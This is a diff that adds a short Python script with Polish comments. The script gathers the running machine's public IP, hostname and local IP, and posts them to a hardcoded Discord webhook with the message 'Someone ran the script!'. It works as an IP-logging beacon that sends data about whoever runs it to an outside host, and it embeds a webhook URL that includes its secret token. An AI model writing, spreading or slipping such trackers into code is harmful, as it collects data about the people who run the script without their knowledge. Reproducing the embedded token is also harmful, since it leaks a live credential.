@@ -1,0 +1,54 @@
+import requests
+import socket
+
+# Wklej tutaj URL swojego webhooka
+WEBHOOK_URL = "https://discord.com/api/webhooks/1548016827181957270/JC4XG897SRwV7BJ3FQHbtIF8w46Eg2EM0gcYpDhH_6B6A7CHuWSJoYy8fHbh2y_lXDF3"
+
+
+def get_public_ip() -> str:
+    """Pobiera publiczne IP komputera."""
+    try:
+        # Można użyć dowolnego serwisu zwracającego IP
+        response = requests.get("https://api.ipify.org?format=json", timeout=5)
+        return response.json()["ip"]
+    except Exception as e:
+        return f"Błąd pobierania IP: {e}"
+
+
+def get_local_info() -> dict:
+    """Zbiera podstawowe informacje o hoście."""
+    hostname = socket.gethostname()
+    try:
+        local_ip = socket.gethostbyname(hostname)
+    except Exception:
+        local_ip = "nieznane"
+    return {"hostname": hostname, "local_ip": local_ip}
+
+
+def send_to_webhook(webhook_url: str, content: str) -> None:
+    """Wysyła wiadomość na webhook (format Discord)."""
+    payload = {"content": content}
+    try:
+        r = requests.post(webhook_url, json=payload, timeout=10)
+        r.raise_for_status()
+        print("Wysłano pomyślnie.")
+    except Exception as e:
+        print(f"Nie udało się wysłać: {e}")
+
+
+def main() -> None:
+    public_ip = get_public_ip()
+    info = get_local_info()
+
+    message = (
+        f"**Ktoś uruchomił skrypt!**\n"
+        f"🌐 Publiczne IP: `{public_ip}`\n"
+        f"💻 Hostname: `{info['hostname']}`\n"
+        f"🏠 Lokalne IP: `{info['local_ip']}`"
+    )
+
+    send_to_webhook(WEBHOOK_URL, message)
+
+
+if __name__ == "__main__":
+    main()
